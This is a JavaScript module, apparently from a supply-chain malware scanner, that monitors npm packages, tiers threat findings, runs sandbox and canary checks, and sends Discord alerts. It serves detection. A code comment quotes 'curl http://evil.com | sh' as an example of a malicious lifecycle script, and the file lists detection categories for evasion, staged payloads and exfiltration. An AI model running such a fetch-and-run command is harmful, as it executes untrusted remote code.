const https = require('https');
const fs = require('fs');
const path = require('path');
const os = require('os');
const { run } = require('./index.js');
const { runSandbox, isDockerAvailable } = require('./sandbox/index.js');
const { sendWebhook } = require('./webhook.js');
const { detectSuddenLifecycleChange } = require('./temporal-analysis.js');
const { detectSuddenAstChanges } = require('./temporal-ast-diff.js');
const { detectPublishAnomaly } = require('./publish-anomaly.js');
const { detectMaintainerChange } = require('./maintainer-change.js');
const { downloadToFile, extractTarGz, sanitizePackageName } = require('./shared/download.js');
const { MAX_TARBALL_SIZE } = require('./shared/constants.js');

// Self-exclude: never scan our own package through the monitor
const SELF_PACKAGE_NAME = require('../package.json').name; // 'muaddib-scanner'

// Prevent unhandled promise rejections from crashing the monitor process
process.on('unhandledRejection', (reason, promise) => {
  console.error('[MONITOR] Unhandled rejection:', reason);
});

const STATE_FILE = path.join(__dirname, '..', 'data', 'monitor-state.json');
const ALERTS_FILE = path.join(__dirname, '..', 'data', 'monitor-alerts.json');
const DETECTIONS_FILE = path.join(__dirname, '..', 'data', 'detections.json');
const SCAN_STATS_FILE = path.join(__dirname, '..', 'data', 'scan-stats.json');
const LAST_DAILY_REPORT_FILE = path.join(__dirname, '..', 'data', 'last-daily-report.json');
const DAILY_STATS_FILE = path.join(__dirname, '..', 'data', 'daily-stats.json');
const TEMPORAL_DETECTIONS_FILE = path.join(__dirname, '..', 'data', 'temporal-detections.json');

// Local log persistence directories (parallel to Discord webhooks for offline analysis)
// Primary: logs/ relative to project root. Fallback: /tmp/ if primary is read-only (EROFS/EACCES).
const PRIMARY_DAILY_REPORTS_DIR = path.join(__dirname, '..', 'logs', 'daily-reports');
const PRIMARY_ALERTS_DIR = path.join(__dirname, '..', 'logs', 'alerts');
const FALLBACK_DAILY_REPORTS_DIR = path.join(require('os').tmpdir(), 'muaddib-daily-reports');
const FALLBACK_ALERTS_DIR = path.join(require('os').tmpdir(), 'muaddib-alerts');

/**
 * Try to ensure a directory exists and is writable. Returns the usable path
 * or a fallback path if the primary is read-only / permission-denied.
 */
function resolveWritableDir(primary, fallback) {
  try {
    fs.mkdirSync(primary, { recursive: true });
    // Verify writability with a probe file
    const probe = path.join(primary, '.write-test');
    fs.writeFileSync(probe, '', 'utf8');
    fs.unlinkSync(probe);
    return primary;
  } catch (err) {
    if (err.code === 'EROFS' || err.code === 'EACCES' || err.code === 'EPERM') {
      console.warn(`[MONITOR] WARNING: ${primary} is not writable (${err.code}). Falling back to ${fallback}`);
      try {
        fs.mkdirSync(fallback, { recursive: true });
        return fallback;
      } catch (fallbackErr) {
        console.error(`[MONITOR] ERROR: Fallback ${fallback} also not writable: ${fallbackErr.message}`);
        return fallback; // Return anyway — individual writes will catch errors
      }
    }
    throw err; // Unexpected error — let it propagate
  }
}

const DAILY_REPORTS_LOG_DIR = resolveWritableDir(PRIMARY_DAILY_REPORTS_DIR, FALLBACK_DAILY_REPORTS_DIR);
const ALERTS_LOG_DIR = resolveWritableDir(PRIMARY_ALERTS_DIR, FALLBACK_ALERTS_DIR);

/**
 * Atomic file write: write to .tmp then rename (crash-safe).
 * Prevents race conditions and partial writes from corrupting data files.
 * On EROFS/EACCES, logs a warning and skips (non-fatal for monitor uptime).
 * @param {string} filePath - Target file path
 * @param {string} data - Content to write
 */
function atomicWriteFileSync(filePath, data) {
  const dir = path.dirname(filePath);
  try {
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  } catch (err) {
    if (err.code === 'EROFS' || err.code === 'EACCES' || err.code === 'EPERM') {
      console.warn(`[MONITOR] Cannot create directory ${dir} (${err.code}) — skipping write to ${path.basename(filePath)}`);
      return;
    }
    throw err;
  }
  const tmpFile = filePath + '.tmp';
  try {
    fs.writeFileSync(tmpFile, data, 'utf8');
    fs.renameSync(tmpFile, filePath);
  } catch (err) {
    if (err.code === 'EROFS' || err.code === 'EACCES' || err.code === 'EPERM') {
      console.warn(`[MONITOR] Cannot write ${path.basename(filePath)} (${err.code}) — skipping`);
      // Clean up .tmp if it was partially written
      try { fs.unlinkSync(tmpFile); } catch (_) { /* ignore */ }
      return;
    }
    throw err;
  }
}

/**
 * Append a temporal detection to the temporal detections file.
 * @param {string} name - Package name
 * @param {string} version - Package version
 * @param {Array} findings - Temporal findings array
 */
function appendTemporalDetection(name, version, findings) {
  let detections = [];
  try {
    if (fs.existsSync(TEMPORAL_DETECTIONS_FILE)) {
      detections = JSON.parse(fs.readFileSync(TEMPORAL_DETECTIONS_FILE, 'utf8'));
    }
  } catch { /* corrupted file — start fresh */ }
  detections.push({
    name,
    version,
    findings,
    timestamp: new Date().toISOString()
  });
  // Keep last 1000 entries
  if (detections.length > 1000) {
    detections = detections.slice(-1000);
  }
  atomicWriteFileSync(TEMPORAL_DETECTIONS_FILE, JSON.stringify(detections, null, 2));
}

/**
 * Load temporal detections from file.
 * @returns {Array} Array of temporal detection entries
 */
function loadTemporalDetections() {
  try {
    if (fs.existsSync(TEMPORAL_DETECTIONS_FILE)) {
      return JSON.parse(fs.readFileSync(TEMPORAL_DETECTIONS_FILE, 'utf8'));
    }
  } catch { /* ignore */ }
  return [];
}

const DAILY_STATS_PERSIST_INTERVAL = 10; // Persist to disk every N scans
const POLL_INTERVAL = 60_000;
const POLL_MAX_BACKOFF = 960_000; // 16 minutes max backoff
const SCAN_TIMEOUT_MS = 180_000; // 3 minutes per package

// --- Popularity pre-filter ---
const POPULAR_THRESHOLD = 50_000; // Weekly downloads to classify as "popular"
const DOWNLOADS_CACHE_TTL = 24 * 60 * 60 * 1000; // 24h
const downloadsCache = new Map(); // key: packageName → { downloads, fetchedAt }

// --- Stats counters ---

const stats = {
  scanned: 0,
  clean: 0,
  suspect: 0,
  suspectByTier: { t1: 0, t2: 0, t3: 0 },
  errors: 0,
  errorsByType: { too_large: 0, tar_failed: 0, http_error: 0, timeout: 0, other: 0 },
  totalTimeMs: 0,
  lastReportTime: Date.now(),
  lastDailyReportDate: null // YYYY-MM-DD (Paris) of last daily report sent
};

/**
 * Classify an error into a category for the daily report breakdown.
 * @param {Error} err
 * @returns {'too_large'|'tar_failed'|'http_error'|'timeout'|'other'}
 */
function classifyError(err) {
  const msg = (err && err.message) || '';
  if (/too large|tarball too large/i.test(msg)) return 'too_large';
  if (/tar\b|extract/i.test(msg)) return 'tar_failed';
  if (/HTTP [45]\d\d|HTTP \d{3}/i.test(msg)) return 'http_error';
  if (/timeout/i.test(msg)) return 'timeout';
  return 'other';
}

/**
 * Increment error counter with category tracking.
 * @param {Error} [err] - optional error for classification
 */
function recordError(err) {
  stats.errors++;
  const category = err ? classifyError(err) : 'other';
  stats.errorsByType[category]++;
}

// Track daily suspects for the daily report (name, version, ecosystem, findingsCount)
const dailyAlerts = [];

// Deduplication: track recently scanned packages (cleared every 24h with daily report)
const recentlyScanned = new Set();

// Webhook dedup: track alerted packages by name → Set<rule_ids> (cleared with daily report).
// If a new version triggers the same rules, skip the webhook. If new rules appear, let it through.
const alertedPackageRules = new Map();

// Scope grouping: buffer scoped npm packages for grouped webhooks (monorepo noise reduction).
// @scope → { packages[], timer, maxScore, ecosystem }
const SCOPE_GROUP_WINDOW_MS = 5 * 60 * 1000; // 5 minutes
const pendingGrouped = new Map();

// Consecutive poll error tracking for exponential backoff
let consecutivePollErrors = 0;

// Counter for throttled disk persistence
let scansSinceLastPersist = 0;

// --- Scan queue (FIFO, sequential) ---

const scanQueue = [];

// --- Sandbox integration ---

let sandboxAvailable = false;

function isCanaryEnabled() {
  const env = process.env.MUADDIB_MONITOR_CANARY;
  if (env !== undefined && env.toLowerCase() === 'false') return false;
  return true;
}

function buildCanaryExfiltrationWebhookEmbed(packageName, version, exfiltrations) {
  const exfilLines = exfiltrations.map(e => {
    return `**${e.token}** — ${e.foundIn}`;
  }).join('\n');

  const npmLink = `https://www.npmjs.com/package/${packageName}`;

  return {
    embeds: [{
      title: '\uD83D\uDD34 CANARY EXFILTRATION \u2014 CRITICAL',
      color: 0xe74c3c,
      fields: [
        { name: 'Package', value: `[${packageName}](${npmLink})`, inline: true },
        { name: 'Version', value: version || 'N/A', inline: true },
        { name: 'Severity', value: 'CRITICAL', inline: true },
        { name: 'Exfiltrated Tokens', value: exfilLines || 'None', inline: false },
        { name: 'Action', value: 'CONFIRMED MALICIOUS \u2014 Do NOT install, report to npm', inline: false }
      ],
      footer: {
        text: `MUAD'DIB Canary Token Analysis | ${new Date().toISOString().replace('T', ' ').replace(/\.\d+Z$/, ' UTC')}`
      },
      timestamp: new Date().toISOString()
    }]
  };
}

function isSandboxEnabled() {
  const env = process.env.MUADDIB_MONITOR_SANDBOX;
  if (env !== undefined && env.toLowerCase() === 'false') return false;
  return true;
}

function isTemporalEnabled() {
  const env = process.env.MUADDIB_MONITOR_TEMPORAL;
  if (env !== undefined && env.toLowerCase() === 'false') return false;
  return true;
}

function hasHighOrCritical(result) {
  return result.summary.critical > 0 || result.summary.high > 0;
}

// --- Verbose mode (--verbose sends ALL alerts including temporal/publish/maintainer) ---
// @deprecated verboseMode is unused in production — temporal/publish/maintainer
// alerts are controlled by their own feature flags (isTemporalEnabled, etc.).
// Retained for backward compatibility with existing tests and CLI flag parsing.

let verboseMode = false;

/** @deprecated See comment above. */
function isVerboseMode() {
  if (verboseMode) return true;
  const env = process.env.MUADDIB_MONITOR_VERBOSE;
  return env !== undefined && env.toLowerCase() === 'true';
}

/** @deprecated See comment above. */
function setVerboseMode(value) {
  verboseMode = !!value;
}

// --- IOC match types (these are the only static-analysis types that warrant a webhook) ---

const IOC_MATCH_TYPES = new Set([
  'known_malicious_package',
  'known_malicious_hash',
  'pypi_malicious_package',
  'shai_hulud_marker',
  'shai_hulud_backdoor'
]);

function hasIOCMatch(result) {
  if (!result || !result.threats) return false;
  return result.threats.some(t => IOC_MATCH_TYPES.has(t.type));
}

function hasTyposquat(result) {
  if (!result || !result.threats) return false;
  return result.threats.some(t => t.type === 'typosquat_detected' || t.type === 'pypi_typosquat_detected');
}

function hasLifecycleScript(result) {
  if (!result || !result.threats) return false;
  return result.threats.some(t => t.type === 'lifecycle_script');
}

// --- Suspect tier constants ---

// Tier 1: high-intent threat types that always warrant sandbox analysis
const TIER1_TYPES = new Set([
  'sandbox_evasion', 'env_charcode_reconstruction',
  'staged_payload', 'staged_binary_payload',
  'mcp_config_injection', 'ai_agent_abuse', 'crypto_miner'
]);

// Tier 2: active threat types that warrant sandbox when queue pressure is low
const TIER2_ACTIVE_TYPES = new Set([
  'suspicious_dataflow', 'dangerous_call_eval', 'dangerous_call_function'
]);

// Tier 3: passive/informational types — no sandbox, no stats.suspect increment
const TIER3_PASSIVE_TYPES = new Set([
  'sensitive_string', 'suspicious_domain', 'obfuscation_detected',
  'prototype_hook', 'env_access', 'dynamic_import',
  'dynamic_require', 'high_entropy_string'
]);

/**
 * Classify a scan result into suspect tiers.
 * @param {Object} result - scan result with threats and summary
 * @returns {{ suspect: boolean, tier: 1|2|3|null }}
 *   - tier 1: sandbox obligatoire (HIGH/CRITICAL, lifecycle, high-intent types)
 *   - tier 2: sandbox si queue < 50 (2+ distinct types with active signal)
 *   - tier 3: logged only, no sandbox, no stats.suspect (passive-only signals)
 *   - { suspect: false, tier: null } for CLEAN packages
 */
function isSuspectClassification(result) {
  if (!result || !result.threats || result.threats.length === 0) {
    return { suspect: false, tier: null };
  }

  // Tier 1: HIGH/CRITICAL severity, lifecycle scripts, or high-intent types
  if (result.summary.critical > 0 || result.summary.high > 0) {
    return { suspect: true, tier: 1 };
  }
  if (hasLifecycleScript(result)) {
    return { suspect: true, tier: 1 };
  }
  if (result.threats.some(t => TIER1_TYPES.has(t.type))) {
    return { suspect: true, tier: 1 };
  }

  const distinctTypes = new Set(result.threats.map(t => t.type));
  if (distinctTypes.size < 2) {
    return { suspect: false, tier: null };
  }

  // Tier 2: 2+ distinct types with at least one active type
  if (result.threats.some(t => TIER2_ACTIVE_TYPES.has(t.type))) {
    return { suspect: true, tier: 2 };
  }

  // Tier 3: 2+ distinct types but all passive
  const allPassive = result.threats.every(t => TIER3_PASSIVE_TYPES.has(t.type));
  if (allPassive) {
    return { suspect: true, tier: 3 };
  }

  // 2+ distinct types with non-passive types not in tier 2 active list — tier 2
  return { suspect: true, tier: 2 };
}

/**
 * Format error count with breakdown by type for the daily report.
 * Returns "0" if no errors, or "138 (HTTP: 60, tar: 40, timeout: 20, other: 18)" style.
 */
function formatErrorBreakdown(total, byType) {
  if (total === 0) return '0';
  const parts = [];
  if (byType.http_error > 0) parts.push(`HTTP: ${byType.http_error}`);
  if (byType.tar_failed > 0) parts.push(`tar: ${byType.tar_failed}`);
  if (byType.too_large > 0) parts.push(`too large: ${byType.too_large}`);
  if (byType.timeout > 0) parts.push(`timeout: ${byType.timeout}`);
  if (byType.other > 0) parts.push(`other: ${byType.other}`);
  if (parts.length === 0) return `${total}`;
  return `${total} (${parts.join(', ')})`;
}

function formatFindings(result) {
  if (!result || !result.threats || result.threats.length === 0) return '';
  const seen = new Set();
  const parts = [];
  for (const t of result.threats) {
    const key = `${t.type}(${t.severity})`;
    if (!seen.has(key)) {
      seen.add(key);
      parts.push(key);
    }
  }
  return parts.join(', ');
}

// --- Strict webhook filtering helpers ---

/**
 * Returns true if a lifecycle script value is benign (npm run/build/test/lint/typecheck only).
 * Scripts like "npm run build", "npm test && npm run lint" are safe.
 * Scripts like "curl http://evil.com | sh" or "node malware.js" are NOT safe.
 */
function isSafeLifecycleScript(scriptValue) {
  if (!scriptValue || typeof scriptValue !== 'string') return false;
  const commands = scriptValue.trim().split(/\s*&&\s*/);
  return commands.every(cmd => {
    const trimmed = cmd.trim();
    // npm/yarn/pnpm/bun run <task> or direct tool calls
    if (/^(npm|yarn|pnpm|bun)\s+(run\s+)?(build|test|lint|typecheck|prepare|compile|format|clean|tsc|check|prebuild|postbuild)\s*$/i.test(trimmed)) return true;
    // Standalone tool commands
    if (/^(tsc|eslint|prettier|jest|vitest|mocha|rollup|webpack|esbuild|vite|tsup|unbuild|turbo)\b/i.test(trimmed)) return true;
    // echo (informational, no side effects)
    if (/^echo\s+/i.test(trimmed)) return true;
    // exit 0 / true / : (no-ops)
    if (/^(exit\s+0|true|:)\s*$/i.test(trimmed)) return true;
    return false;
  });
}

/**
 * Returns true if ALL temporal lifecycle findings are safe (benign scripts only).
 * If any finding has a suspicious script, returns false.
 */
function hasOnlySafeTemporalFindings(temporalResult) {
  if (!temporalResult || !temporalResult.findings || temporalResult.findings.length === 0) return true;
  return temporalResult.findings.every(f => {
    const script = f.value || f.newValue || '';
    return isSafeLifecycleScript(script);
  });
}

/**
 * Returns true if AST anomaly findings represent a dangerous combination.
 * Isolated fetch or child_process additions are NOT enough to warrant a webhook.
 *
 * Sends webhook for:
 *   - eval or Function added (always dangerous)
 *   - child_process + credential access (process.env, fs.readFile_sensitive)
 *   - child_process + network (fetch, http, https, dns, net)
 *   - net.connect combined with other patterns
 *
 * Does NOT send for:
 *   - fetch alone
 *   - child_process alone
 *   - any single isolated pattern (except eval/Function)
 */
function isAstAnomalyCombined(astResult) {
  if (!astResult || !astResult.findings || astResult.findings.length === 0) return false;
  const patterns = new Set(astResult.findings.map(f => f.pattern));

  // eval or Function added — always dangerous
  if (patterns.has('eval') || patterns.has('Function')) return true;

  // net.connect is CRITICAL — send if combined with any other pattern
  if (patterns.has('net.connect') && patterns.size > 1) return true;

  const hasChildProcess = patterns.has('child_process');

  // child_process + credential access
  const hasCredential = patterns.has('process.env') || patterns.has('fs.readFile_sensitive');
  if (hasChildProcess && hasCredential) return true;

  // child_process + network
  const hasNetwork = patterns.has('fetch') || patterns.has('http_request')
    || patterns.has('https_request') || patterns.has('dns.lookup');
  if (hasChildProcess && hasNetwork) return true;

  // Isolated fetch, child_process, or any single pattern — not combined enough
  return false;
}

// --- Webhook alerting ---

function getWebhookUrl() {
  return process.env.MUADDIB_WEBHOOK_URL || null;
}

function shouldSendWebhook(result, sandboxResult) {
  if (!getWebhookUrl()) return false;

  const staticScore = (result && result.summary) ? (result.summary.riskScore || 0) : 0;
  const sandboxScore = (sandboxResult && sandboxResult.score !== undefined) ? sandboxResult.score : -1;
  const sandboxRan = sandboxScore >= 0;

  // 1. IOC match — ALWAYS send, regardless of sandbox result.
  // IOC matches are highest-confidence (225K+ known malicious packages).
  // Sandbox can miss time-bombs, env-specific, browser-only payloads.
  if (hasIOCMatch(result)) return true;

  // 2. Real sandbox detection (> 30) — always send
  if (sandboxScore > 30) return true;

  // 3. Sandbox clean (0) or timeout noise (1-15): suppress unless static is strong.
  // Dormant malware can be statically suspicious but dynamically clean.
  // Threshold >= 20 aligned with BENIGN_THRESHOLD — packages exceeding benign
  // baseline with HIGH/CRITICAL findings deserve an alert. hasHighOrCritical()
  // guards against FP (benign score 25 with only MEDIUM/LOW won't pass).
  if (sandboxRan && sandboxScore <= 15) {
    return staticScore >= 20 && hasHighOrCritical(result);
  }

  // 4. Sandbox moderate (16-30): send if static corroborates
  if (sandboxRan && sandboxScore > 15 && sandboxScore <= 30) {
    return staticScore >= 20 && hasHighOrCritical(result);
  }

  // 5. No sandbox: static-only thresholds
  if (staticScore >= 20 && hasHighOrCritical(result)) return true;

  return false;
}

function buildMonitorWebhookPayload(name, version, ecosystem, result, sandboxResult) {
  const payload = {
    event: 'malicious_package',
    package: name,
    version,
    ecosystem,
    timestamp: new Date().toISOString(),
    findings: result.threats.map(t => ({
      rule: t.rule_id || t.type,
      severity: t.severity
    }))
  };
  if (sandboxResult && sandboxResult.score > 0) {
    payload.sandbox = {
      score: sandboxResult.score,
      severity: sandboxResult.severity
    };
  }
  return payload;
}

function computeRiskLevel(summary) {
  // Score-based thresholds aligned with src/scoring.js RISK_THRESHOLDS (75/50/25)
  if (summary.riskScore !== undefined) {
    if (summary.riskScore >= 75) return 'CRITICAL';
    if (summary.riskScore >= 50) return 'HIGH';
    if (summary.riskScore >= 25) return 'MEDIUM';
    if (summary.riskScore > 0) return 'LOW';
    return 'CLEAN';
  }
  // Fallback when riskScore not available (e.g. legacy callers)
  if (summary.critical > 0) return 'CRITICAL';
  if (summary.high > 0) return 'HIGH';
  if (summary.medium > 0) return 'MEDIUM';
  if (summary.low > 0) return 'LOW';
  return 'CLEAN';
}

function computeRiskScore(summary) {
  const raw = (summary.critical || 0) * 25
            + (summary.high || 0) * 10
            + (summary.medium || 0) * 3
            + (summary.low || 0) * 1;
  return Math.min(raw, 100);
}

/**
 * Compute a reputation factor for a package based on registry metadata.
 * Monitor-only: adjusts the score used for webhook decisions without
 * mutating the persisted alert score.
 *
 * Established packages (old, many versions, high downloads) get a factor < 1.0
 * that attenuates the webhook score.  New/suspicious packages get > 1.0.
 * Clamped to [0.3, 1.5].
 *
 * @param {Object|null} metadata - Registry metadata from getPackageMetadata()
 * @returns {number} factor in [0.3, 1.5]
 */
function computeReputationFactor(metadata) {
  if (!metadata) return 1.0;
  let factor = 1.0;

  // Age signal (mutually exclusive branches)
  const ageDays = metadata.age_days;
  if (ageDays !== null && ageDays !== undefined) {
    if (ageDays > 730) factor -= 0.3;
    else if (ageDays > 365) factor -= 0.15;
    else if (ageDays < 7) factor += 0.3;
    else if (ageDays < 30) factor += 0.2;
  }

  // Version count signal (mutually exclusive)
  const versionCount = metadata.version_count || 0;
  if (versionCount > 50) factor -= 0.2;
  else if (versionCount > 20) factor -= 0.1;
  else if (versionCount === 1) factor += 0.2;
  else if (versionCount <= 2) factor += 0.15;

  // Downloads signal
  const downloads = metadata.weekly_downloads || 0;
  if (downloads > 100000) factor -= 0.2;
  else if (downloads > 50000) factor -= 0.1;
  else if (downloads < 10) factor += 0.15;
  else if (downloads < 100) factor += 0.1;

  return Math.max(0.3, Math.min(1.5, factor));
}

/**
 * Persist a CRITICAL/HIGH alert to logs/alerts/YYYY-MM-DD-HH-mm-ss-<package>.json
 * Same payload as webhook — enables offline FPR/TPR trend analysis.
 */
function persistAlert(name, version, ecosystem, webhookData) {
  try {
    const now = new Date();
    const ts = now.toISOString().replace(/[:.]/g, '-').replace('Z', '');
    const safeName = (name || 'unknown').replace(/[/\\@]/g, '_');
    const filename = `${ts}-${safeName}.json`;
    const filePath = path.join(ALERTS_LOG_DIR, filename);
    atomicWriteFileSync(filePath, JSON.stringify(webhookData, null, 2));
  } catch (err) {
    console.error(`[MONITOR] Failed to persist alert for ${name}@${version}: ${err.message}`);
  }
}

/**
 * Persist a daily report to logs/daily-reports/YYYY-MM-DD.json
 * Same payload as Discord embed + raw metrics for trend analysis.
 */
function persistDailyReport(reportPayload, rawMetrics) {
  try {
    const today = getParisDateString();
    const filePath = path.join(DAILY_REPORTS_LOG_DIR, `${today}.json`);
    const data = {
      date: today,
      timestamp: new Date().toISOString(),
      embed: reportPayload,
      metrics: rawMetrics
    };
    atomicWriteFileSync(filePath, JSON.stringify(data, null, 2));
    console.log(`[MONITOR] Daily report persisted to ${filePath}`);
  } catch (err) {
    console.error(`[MONITOR] Failed to persist daily report: ${err.message}`);
  }
}

function buildAlertData(name, version, ecosystem, result, sandboxResult) {
  const webhookData = {
    target: `${ecosystem}/${name}@${version}`,
    timestamp: new Date().toISOString(),
    ecosystem,
    summary: {
      ...result.summary,
      riskLevel: result.summary.riskLevel || computeRiskLevel(result.summary),
      riskScore: result.summary.riskScore || computeRiskScore(result.summary)
    },
    threats: result.threats
  };
  if (sandboxResult && sandboxResult.score > 0) {
    webhookData.sandbox = {
      score: sandboxResult.score,
      severity: sandboxResult.severity
    };
  }
  return webhookData;
}

async function trySendWebhook(name, version, ecosystem, result, sandboxResult) {
  if (!shouldSendWebhook(result, sandboxResult)) {
    if (sandboxResult && sandboxResult.score === 0) {
      console.log(`[MONITOR] SUPPRESSED (sandbox clean, low static): ${name}@${version}`);
    }
    return;
  }

  if (sandboxResult && sandboxResult.score === 0) {
    const staticScore = (result && result.summary) ? (result.summary.riskScore || 0) : 0;
    console.log(`[MONITOR] DORMANT SUSPECT: ${name}@${version} (static score: ${staticScore}, sandbox clean — possible evasive malware)`);
  }

  // Webhook dedup: if the same package was already alerted today with the exact same rules,
  // skip the webhook. Different versions of the same package triggering identical findings
  // (e.g. @agenticmail/enterprise 0.5.479, 0.5.490, 0.5.494) generate redundant noise.
  // If a new version introduces NEW rules, the alert passes through normally.
  const currentRules = new Set(result.threats.map(t => t.rule_id || t.type));
  const previousRules = alertedPackageRules.get(name);
  if (previousRules) {
    const newRules = [...currentRules].filter(r => !previousRules.has(r));
    if (newRules.length === 0) {
      console.log(`[MONITOR] DEDUP: ${name} (already alerted today with same rules)`);
      return;
    }
    // New rules found — let alert through and update the tracked set
    for (const r of currentRules) previousRules.add(r);
  } else {
    alertedPackageRules.set(name, new Set(currentRules));
  }

  // Scope grouping: buffer scoped npm packages for grouped webhook
  const scope = extractScope(name);
  if (scope && ecosystem === 'npm') {
    bufferScopedWebhook(scope, name, version, ecosystem, result, sandboxResult);
    return;
  }

  // Non-scoped: send immediately (existing behavior)
  const url = getWebhookUrl();
  const webhookData = buildAlertData(name, version, ecosystem, result, sandboxResult);
  try {
    await sendWebhook(url, webhookData);
    console.log(`[MONITOR] Webhook sent for ${name}@${version}`);
  } catch (err) {
    console.error(`[MONITOR] Webhook failed for ${name}@${version}: ${err.message}`);
  }
}

/**
 * Extract the npm scope from a package name, e.g. '@scope/pkg' → '@scope'.
 * Returns null for unscoped packages.
 */
function extractScope(name) {
  if (typeof name !== 'string') return null;
  const match = name.match(/^(@[^/]+)\//);
  return match ? match[1] : null;
}

/**
 * Buffer a scoped package webhook for grouped delivery.
 * Multiple packages from the same scope published within SCOPE_GROUP_WINDOW_MS
 * are grouped into a single webhook (monorepo noise reduction).
 */
function bufferScopedWebhook(scope, name, version, ecosystem, result, sandboxResult) {
  const entry = {
    name, version,
    score: (result && result.summary) ? (result.summary.riskScore || 0) : 0,
    threats: result.threats || [],
    sandboxResult
  };

  const existing = pendingGrouped.get(scope);
  if (existing) {
    existing.packages.push(entry);
    if (entry.score > existing.maxScore) existing.maxScore = entry.score;
    console.log(`[MONITOR] GROUPED: ${name}@${version} \u2192 scope ${scope} (${existing.packages.length} packages, max=${existing.maxScore})`);
  } else {
    const group = {
      packages: [entry],
      maxScore: entry.score,
      ecosystem,
      timer: setTimeout(() => flushScopeGroup(scope), SCOPE_GROUP_WINDOW_MS)
    };
    if (group.timer.unref) group.timer.unref();
    pendingGrouped.set(scope, group);
    console.log(`[MONITOR] GROUPED: ${name}@${version} started scope group ${scope} (5 min window)`);
  }
}

/**
 * Flush a scope group: send grouped webhook or individual webhook if only 1 package.
 */
async function flushScopeGroup(scope) {
  const group = pendingGrouped.get(scope);
  if (!group) return;
  pendingGrouped.delete(scope);

  const url = getWebhookUrl();
  if (!url) return;

  // Single package in group: send as normal webhook (no grouping noise)
  if (group.packages.length === 1) {
    const pkg = group.packages[0];
    const result = {
      threats: pkg.threats,
      summary: { riskScore: pkg.score }
    };
    const webhookData = buildAlertData(pkg.name, pkg.version, group.ecosystem, result, pkg.sandboxResult);
    try {
      await sendWebhook(url, webhookData);
      console.log(`[MONITOR] Webhook sent for ${pkg.name}@${pkg.version} (scope group flush, single)`);
    } catch (err) {
      console.error(`[MONITOR] Webhook failed for ${pkg.name}@${pkg.version}: ${err.message}`);
    }
    return;
  }

  // Multiple packages: build grouped Discord embed
  const pkgLines = group.packages.map(p =>
    `\u2022 \`${p.name}@${p.version}\` \u2014 score: ${p.score}`
  ).join('\n');

  // Deduplicate threat types across all packages, top 5
  const allTypes = new Set();
  for (const p of group.packages) {
    for (const t of p.threats) allTypes.add(t.type);
  }
  const topThreats = [...allTypes].slice(0, 5).join(', ') || 'none';

  const color = group.maxScore >= 75 ? 0xe74c3c
    : group.maxScore >= 50 ? 0xe67e22
    : group.maxScore >= 25 ? 0xf1c40f
    : 0x95a5a6;

  const payload = {
    embeds: [{
      title: `\uD83D\uDCE6 SCOPE GROUP \u2014 ${scope} (${group.packages.length} packages)`,
      color,
      fields: [
        { name: 'Max Score', value: String(group.maxScore), inline: true },
        { name: 'Packages', value: String(group.packages.length), inline: true },
        { name: 'Ecosystem', value: group.ecosystem, inline: true },
        { name: 'Package List', value: pkgLines.slice(0, 1024), inline: false },
        { name: 'Top Threat Types', value: topThreats, inline: false }
      ],
      footer: {
        text: `MUAD'DIB Monitor | ${new Date().toISOString().replace('T', ' ').replace(/\.\d+Z$/, ' UTC')}`
      },
      timestamp: new Date().toISOString()
    }]
  };

  try {
    await sendWebhook(url, payload, { rawPayload: true });
    console.log(`[MONITOR] Grouped webhook sent for ${scope} (${group.packages.length} packages, max=${group.maxScore})`);
  } catch (err) {
    console.error(`[MONITOR] Grouped webhook failed for ${scope}: ${err.message}`);
  }
}

// --- Temporal analysis integration ---
// Note: buildTemporalWebhookEmbed, buildTemporalAstWebhookEmbed,
// buildPublishAnomalyWebhookEmbed, buildMaintainerChangeWebhookEmbed
// are currently unused in production (temporal alerts go through trySendWebhook
// via the main alerting path). Retained for potential future Discord rich embed use.

function buildTemporalWebhookEmbed(temporalResult) {
  const findings = temporalResult.findings || [];
  const topFinding = findings[0] || {};
  const severity = topFinding.severity || 'HIGH';
  const color = severity === 'CRITICAL' ? 0xe74c3c : 0xe67e22;
  const emoji = severity === 'CRITICAL' ? '\uD83D\uDD34' : '\uD83D\uDFE0';

  const changeLines = findings.map(f => {
    const action = f.type === 'lifecycle_added' ? 'ADDED' : 'MODIFIED';
    const value = f.type === 'lifecycle_modified' ? f.newValue : f.value;
    return `**${f.script}** script ${action}: \`${value}\``;
  }).join('\n');

  const pkgName = temporalResult.packageName;
  const npmLink = `https://www.npmjs.com/package/${pkgName}`;

  return {
    embeds: [{
      title: `${emoji} TEMPORAL ANOMALY \u2014 ${severity}`,
      color: color,
      fields: [
        { name: 'Package', value: `[${pkgName}](${npmLink})`, inline: true },
        { name: 'Version Change', value: `${temporalResult.previousVersion} \u2192 ${temporalResult.latestVersion}`, inline: true },
        { name: 'Severity', value: severity, inline: true },
        { name: 'Changes Detected', value: changeLines || 'None', inline: false },
        { name: 'Published', value: temporalResult.metadata.latestPublishedAt || 'unknown', inline: true },
        { name: 'Action', value: 'DO NOT INSTALL \u2014 Verify changelog before upgrading', inline: false }
      ],
      footer: {
        text: `MUAD'DIB Temporal Analysis | ${new Date().toISOString().replace('T', ' ').replace(/\.\d+Z$/, ' UTC')}`
      },
      timestamp: new Date().toISOString()
    }]
  };
}

async function tryTemporalAlert(temporalResult, _options) {
  // STRICT FILTER: temporal anomalies are NEVER sent as webhooks — too noisy.
  // Logged to journalctl only. IOC match, sandbox, and canary exfil are the only webhook triggers.
  if (hasOnlySafeTemporalFindings(temporalResult)) {
    console.log(`[MONITOR] ANOMALY (safe scripts, no webhook): temporal lifecycle change for ${temporalResult.packageName}`);
  } else {
    console.log(`[MONITOR] ANOMALY (logged only, never webhook): temporal lifecycle change for ${temporalResult.packageName}`);
  }
}

function isTemporalAstEnabled() {
  const env = process.env.MUADDIB_MONITOR_TEMPORAL_AST;
  if (env !== undefined && env.toLowerCase() === 'false') return false;
  return true;
}

function buildTemporalAstWebhookEmbed(astResult) {
  const findings = astResult.findings || [];
  const topFinding = findings[0] || {};
  const severity = topFinding.severity || 'HIGH';
  const color = severity === 'CRITICAL' ? 0xe74c3c : severity === 'HIGH' ? 0xe67e22 : 0xf1c40f;
  const emoji = severity === 'CRITICAL' ? '\uD83D\uDD34' : severity === 'HIGH' ? '\uD83D\uDFE0' : '\uD83D\uDFE1';

  const changeLines = findings.map(f => {
    return `**${f.pattern}** — ${f.severity}: ${f.description}`;
  }).join('\n');

  const pkgName = astResult.packageName;
  const npmLink = `https://www.npmjs.com/package/${pkgName}`;

  return {
    embeds: [{
      title: `${emoji} AST ANOMALY \u2014 ${severity}`,
      color: color,
      fields: [
